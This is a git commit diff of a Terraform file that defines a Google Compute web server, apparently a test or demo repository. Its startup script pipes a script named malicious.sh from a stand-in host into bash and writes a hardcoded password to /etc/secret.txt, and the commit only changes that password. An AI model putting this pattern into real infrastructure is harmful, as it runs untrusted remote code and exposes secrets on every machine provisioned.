bcdc2c5d6f14504e07806ab58042fb7861148ca9
Mayur <99334268+devopsmayur@users.noreply.github.com>
2025-08-07 10:55:27 +0530

    Feature/world1 (#3)
    * test for the world
    
    * test for the world

--- main.tf
+++ main.tf
@@ -22,7 +22,7 @@ resource "google_compute_instance" "web_server" {
 
   metadata_startup_script = <<-EOF
     #!/bin/bash
-    echo "Sensitive data: password123456" > /etc/secret.txt
+    echo "Sensitive data: password1" > /etc/secret.txt
     curl http://example.com/malicious.sh | bash
   EOF
 
